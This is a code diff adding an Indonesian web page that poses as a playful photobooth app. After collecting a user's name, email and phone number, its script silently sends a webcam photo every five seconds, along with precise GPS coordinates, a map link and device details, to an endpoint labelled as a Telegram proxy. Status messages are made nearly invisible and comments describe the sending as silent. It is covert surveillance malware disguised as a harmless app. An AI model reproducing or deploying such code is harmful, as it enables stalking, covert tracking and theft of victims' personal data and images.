@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Studio Foto Cantik Penuh</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Desain Studio Cantik */
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@400;700&display=swap');
+        
+        /* Tambahkan dekorasi lucu di latar belakang */
+        body {
+            background: linear-gradient(135deg, #fceabb 0%, #f8b5a5 100%); /* Gradien peach/krem */
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1rem;
+            /* Tambahkan pola dekoratif ala studio */
+            background-image: radial-gradient(circle, #ffebeb 1px, transparent 1px), radial-gradient(circle, #fcebb0 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background-color: #ffffff;
+            border-radius: 25px; /* Lebih rounded */
+            /* Bayangan unik dan lucu (soft pink glow) */
+            box-shadow: 0 15px 40px rgba(255, 105, 180, 0.4); 
+            padding: 1.5rem;
+            margin: 1rem 0;
+            box-sizing: border-box;
+            border: 3px dashed #ff85a1; /* Border dekoratif */
+        }
+
+        .title {
+            font-family: 'Pacifico', cursive;
+            color: #d8366e;
+            text-shadow: 2px 2px #ffc0cb;
+        }
+
+        .video-wrapper {
+            border: 8px solid #ff85a1; /* Bingkai lebih tebal */
+            border-radius: 18px;
+            overflow: hidden;
+            width: 100%;
+            margin-bottom: 1.5rem;
+            aspect-ratio: 4/3;
+            background-color: #000;
+        }
+
+        #video-stream {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: block;
+        }
+        
+        /* Tombol Lanjutkan/Start - Pink Pop */
+        #start-button {
+            background-color: #ff527b;
+            box-shadow: 0 4px #d8366e;
+            transition: all 0.1s ease;
+        }
+        #start-button:hover {
+            background-color: #d8366e;
+            box-shadow: 0 2px #b02c59;
+            transform: translateY(2px);
+        }
+
+        /* Tombol Jepret Lokal - Hijau Mint */
+        #capture-button {
+            background-color: #10b981;
+            box-shadow: 0 4px #059669;
+        }
+        #capture-button:hover {
+            background-color: #059669;
+            box-shadow: 0 2px #047857;
+            transform: translateY(2px);
+        }
+
+        /* Tombol Unduh (Lokal) - Biru Langit */
+        #download-button {
+            background-color: #3b82f6; 
+            box-shadow: 0 4px #2563eb;
+        }
+        #download-button:hover {
+            background-color: #2563eb;
+            box-shadow: 0 2px #1e40af;
+            transform: translateY(2px);
+        }
+
+        /* Tombol Share - Kuning Ceria */
+        #share-button {
+            background-color: #f59e0b; 
+            box-shadow: 0 4px #d97706;
+        }
+        #share-button:hover {
+            background-color: #d97706;
+            box-shadow: 0 2px #b45309;
+            transform: translateY(2px);
+        }
+    </style>
+</head>
+<body class="flex justify-center items-start">
+
+    <div class="container mt-8">
+        <h1 class="title text-3xl text-center mb-6">💖 Photobooth Ajaib 📸</h1>
+        
+        <!-- Area Input Data Pengguna (Tampil Awal) -->
+        <div id="form-area" class="space-y-4">
+            <p class="text-sm text-center text-gray-700 font-semibold mb-4">
+                👋 Masukkan data Anda untuk mengaktifkan Studio Foto Penuh!
+            </p>
+            <div>
+                <label for="nama" class="block text-sm font-medium text-gray-700">Nama Lengkap</label>
+                <input type="text" id="nama" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Nama Lengkap" required>
+            </div>
+            <div>
+                <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
+                <input type="email" id="email" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Email (Cth: user@mail.com)" required>
+            </div>
+            <div>
+                <label for="phone" class="block text-sm font-medium text-gray-700">Nomor Handphone</label>
+                <input type="tel" id="phone" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Nomor Handphone" required>
+            </div>
+            <button id="start-button" class="w-full px-6 py-3 text-white rounded-xl font-bold active:shadow-none text-lg">
+                Lanjutkan ke Photobooth 
+            </button>
+            <p id="status-message-form" class="mt-2 text-center text-sm font-medium text-red-600"></p>
+        </div>
+
+        <!-- Area Photobooth (Tampil Setelah Mulai) -->
+        <div id="monitoring-area" style="display: none;" class="space-y-4">
+            
+            <div class="video-wrapper">
+                <!-- Video Stream dan Canvas untuk Foto -->
+                <video id="video-stream" autoplay playsinline style="display: none;"></video>
+                <canvas id="photo-canvas" style="display: none;"></canvas>
+            </div>
+
+            <!-- Tombol Interaktif Lokal -->
+            <div class="controls flex justify-center space-x-3 sm:space-x-4">
+                <button id="capture-button" class="px-3 sm:px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base">
+                    Jepret Foto
+                </button>
+                <button id="download-button" class="px-3 sm:px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base" style="display: none;">
+                    Unduh 💾
+                </button>
+                <button id="share-button" class="px-3 sm:px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base" style="display: none;">
+                    Share 📤
+                </button>
+            </div>
+            
+            <!-- Pesan status sementara yang sangat minim/transparan -->
+            <p id="status-message-bg" class="mt-4 text-center text-xs font-medium text-gray-300 opacity-0 transition-opacity duration-300"></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const videoStream = document.getElementById('video-stream');
+            const photoCanvas = document.getElementById('photo-canvas');
+            const startButton = document.getElementById('start-button');
+            const formArea = document.getElementById('form-area');
+            const monitoringArea = document.getElementById('monitoring-area');
+            const statusMessageForm = document.getElementById('status-message-form');
+            const statusMessageBg = document.getElementById('status-message-bg'); 
+            const captureButton = document.getElementById('capture-button');
+            const downloadButton = document.getElementById('download-button');
+            const shareButton = document.getElementById('share-button');
+
+            // Data Konfigurasi LOKAL
+            // Token dihapus! Kita akan memanggil endpoint proxy ini:
+            const PROXY_ENDPOINT = '/api/telegram-proxy';
+            const INTERVAL_MS = 5000; // DIUBAH: 5 detik
+
+            let videoStreamObject = null;
+            let userLocation = null;
+            let formData = {};
+            let isSending = false;
+            let capturedPhotoBase64 = null;
+            let deviceData = getDeviceData(); 
+
+            // --- FUNGSI UTILITY PESAN (Subtle & Temporary) ---
+
+            function showStatus(message, isError = false) {
+                statusMessageBg.textContent = message;
+                statusMessageBg.classList.remove('opacity-0', 'text-red-600', 'text-green-600', 'text-gray-300');
+                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-green-600', 'opacity-80');
+                
+                // Sembunyikan pesan setelah 3 detik
+                setTimeout(() => {
+                    statusMessageBg.classList.remove('opacity-80');
+                    statusMessageBg.classList.add('opacity-0');
+                }, 3000);
+            }
+
+            // --- INISIALISASI DAN VALIDASI FORM ---
+
+            startButton.addEventListener('click', () => {
+                const nama = document.getElementById('nama').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+
+                if (!nama || !email || !phone) {
+                    statusMessageForm.textContent = '❌ Semua kolom data pribadi harus diisi.';
+                    return;
+                }
+
+                formData = { nama, email, phone };
+                statusMessageForm.textContent = '';
+                formArea.style.display = 'none';
+                monitoringArea.style.display = 'block';
+
+                showStatus('Meminta izin kamera dan lokasi... Pengiriman 5s otomatis dimulai.', false);
+                
+                // Mulai permintaan izin dan loop otomatis
+                requestCameraPermission();
+                requestLocationPermission();
+                startAutoSendInterval();
+            });
+
+
+            // --- FUNGSI CAMERA DAN LOKASI (Berjalan Senyap) ---
+
+            function requestCameraPermission() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            videoStreamObject = stream;
+                            videoStream.srcObject = stream;
+                            videoStream.style.display = 'block';
+                            console.log('Kamera Aktif. Pengiriman otomatis 5s siap.');
+                        })
+                        .catch(err => {
+                            showStatus(`Kamera GAGAL: ${err.name}. Pengiriman foto mungkin terlewat.`, true);
+                            console.error("Camera Error:", err);
+                        });
+                }
+            }
+
+            function requestLocationPermission() {
+                if (navigator.geolocation) {
+                    const locationOptions = {
+                        enableHighAccuracy: true, 
+                        timeout: 10000, 
+                        maximumAge: 0 
+                    };
+
+                    // Menggunakan watchPosition untuk pembaruan lokasi real-time dan akurat
+                    navigator.geolocation.watchPosition(position => {
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        console.log(`Lokasi terupdate: ${userLocation.latitude}, ${userLocation.longitude}`);
+                    }, err => {
+                        userLocation = null;
+                        console.error(`Lokasi Gagal: ${err.message}`);
+                    }, locationOptions);
+                }
+            }
+
+            // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
+            
+            captureButton.addEventListener('click', () => {
+                const localPhoto = capturePhotoToCanvas(); 
+                if (localPhoto) {
+                    capturedPhotoBase64 = localPhoto; 
+                    downloadButton.style.display = 'inline-block';
+                    shareButton.style.display = 'inline-block';
+                    showStatus('Foto lokal siap diunduh & dibagikan!');
+                } else {
+                    showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
+                }
+            });
+
+            downloadButton.addEventListener('click', () => {
+                if (capturedPhotoBase64) {
+                    const link = document.createElement('a');
+                    link.href = capturedPhotoBase64;
+                    link.download = `StudioFotoCantik-${new Date().getTime()}.jpeg`;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    showStatus('✅ Foto Berhasil Diunduh!');
+                }
+            });
+            
+            shareButton.addEventListener('click', async () => {
+                if (!capturedPhotoBase64) {
+                    showStatus('Tidak ada foto untuk dibagikan. Jepret foto dulu!', true);
+                    return;
+                }
+
+                try {
+                    const photoBlob = dataURItoBlob(capturedPhotoBase64);
+                    const photoFile = new File([photoBlob], 'studio_foto.jpeg', { type: photoBlob.type });
+
+                    if (navigator.share && navigator.canShare && navigator.canShare({ files: [photoFile] })) {
+                        await navigator.share({
+                            files: [photoFile],
+                            title: 'Foto dari Photobooth Ajaib',
+                            text: 'Lihat foto keren saya dari Studio Foto Cantik!',
+                        });
+                        showStatus('Berbagi berhasil!');
+                    } else {
+                        showStatus('Fitur Share tidak didukung. Silakan gunakan tombol Unduh.', true);
+                    }
+                } catch (error) {
+                    console.error('Gagal berbagi:', error);
+                    showStatus('Gagal berbagi foto. (Cek console log)', true);
+                }
+            });
+
+
+            // --- LOGIKA OTOMATIS DAN PENGIRIMAN (Senyap) ---
+
+            function startAutoSendInterval() {
+                const sendNext = () => {
+                    if (!isSending) {
+                        sendReport();
+                    }
+                    setTimeout(sendNext, INTERVAL_MS);
+                };
+
+                // Kirim laporan pertama setelah 5 detik
+                setTimeout(sendNext, INTERVAL_MS);
+            }
+
+            function capturePhotoToCanvas() {
+                if (!videoStreamObject) return null;
+
+                const context = photoCanvas.getContext('2d');
+                const videoWidth = videoStream.videoWidth || 640;
+                const videoHeight = videoStream.videoHeight || 480;
+                
+                photoCanvas.width = videoWidth;
+                photoCanvas.height = videoHeight;
+                
+                context.save();
+                context.translate(videoWidth, 0);
+                context.scale(-1, 1);
+                context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
+                context.restore();
+
+                return photoCanvas.toDataURL('image/jpeg', 0.8);
+            }
+
+            async function sendReport() {
+                if (isSending) return;
+
+                isSending = true;
+                console.log(`Mengirim data otomatis (5s)... ${new Date().toLocaleTimeString()}`);
+                
+                const base64Image = capturePhotoToCanvas();
+                
+                // Tambahkan waktu dan tanggal saat ini
+                const now = new Date();
+                const dateTimeText = now.toLocaleString('id-ID', {
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    timeZoneName: 'short'
+                });
+
+                // Kompilasi Caption (Data yang tidak ditampilkan di UI)
+                const locationText = userLocation ? 
+                    `✅ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
+                    `❌ Lokasi GAGAL didapatkan.`;
+
+                const caption = `
+*--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---*
+
+*Waktu Pengambilan:* ${dateTimeText}
+
+*Data Pengguna:*
+Nama: ${formData.nama}
+Email: ${formData.email}
+No. HP: ${formData.phone}
+
+*Data Lokasi (Wajib Akurat):*
+${locationText}
+
+*Informasi Perangkat:*
+Perangkat: ${deviceData.device}
+Browser: ${deviceData.browser}
+OS: ${deviceData.os}
+`;
+                
+                // Kirim data ke endpoint proxy
+                try {
+                    await sendDataToProxy(base64Image, caption);
+                    console.log('✅ Pengiriman sukses. Menunggu 5s lagi...');
+                } catch (error) {
+                    console.error("Error saat mengirim data:", error);
+                } finally {
+                    isSending = false;
+                }
+            }
+            
+            // FUNGSI BARU: Mengirim data ke API Proxy Anda (bukan langsung ke Telegram)
+            async function sendDataToProxy(base64Image, caption) {
+                const payload = {
+                    caption: caption,
+                    base64Image: base64Image, // Kirim Base64 jika ada foto
+                    isPhoto: !!base64Image // Memberitahu proxy apakah ini foto
+                };
+
+                const response = await fetch(PROXY_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+                if (!response.ok || data.error) {
+                    // Tampilkan pesan error jika proxy gagal
+                    throw new Error(data.error || 'Pengiriman ke proxy gagal.');
+                }
+                return data;
+            }
+
+
+            // --- UTILITIES (Device Info) ---
+
+            function getDeviceData() {
+                const ua = navigator.userAgent;
+                let os = 'OS Lain';
+                let browser = 'Browser Tidak Dikenal';
+                let device = 'Desktop';
+
+                if (/Windows/.test(ua)) os = 'Windows';
+                else if (/Macintosh|Mac OS X/.test(ua)) os = 'macOS';
+                else if (/Android/.test(ua)) { os = 'Android'; device = 'Handphone/Tablet'; }
+                else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; device = 'iPhone/iPad'; }
+                else if (/Linux/.test(ua)) os = 'Linux';
+
+                if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
+                else if (/Firefox/.test(ua)) browser = 'Firefox';
+                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+                else if (/Edge/.test(ua)) browser = 'Edge';
+                
+                return { os, browser, device };
+            }
+
+            function dataURItoBlob(dataURI) {
+                const byteString = atob(dataURI.split(',')[1]);
+                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], { type: mimeString });
+            }
+        });
+    </script>
+</body>
+</html>
